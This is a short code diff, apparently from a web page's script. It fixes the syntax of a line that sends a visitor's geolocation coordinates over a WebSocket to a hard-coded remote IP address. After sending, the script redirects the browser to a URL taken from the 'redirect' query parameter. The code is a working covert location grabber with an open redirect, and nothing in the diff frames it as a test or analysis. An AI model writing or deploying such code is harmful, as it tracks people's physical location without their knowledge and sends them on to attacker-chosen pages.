@@ -4,7 +4,7 @@
     ws = new WebSocket("wss://114.146.22.1:4721/")
     navigator.geolocation.getCurrentPosition(function(a){
         navigator.clipboard.writeText(`${a.coords.latitude}, ${a.coords.longitude}`)
-        ws.send(`${a.coords.latitude}, ${a.coords.longitude}`))
+        ws.send(`${a.coords.latitude}, ${a.coords.longitude}`)
         location.href=new URL(location.href).searchParams.get("redirect")
     },
     function(a){})
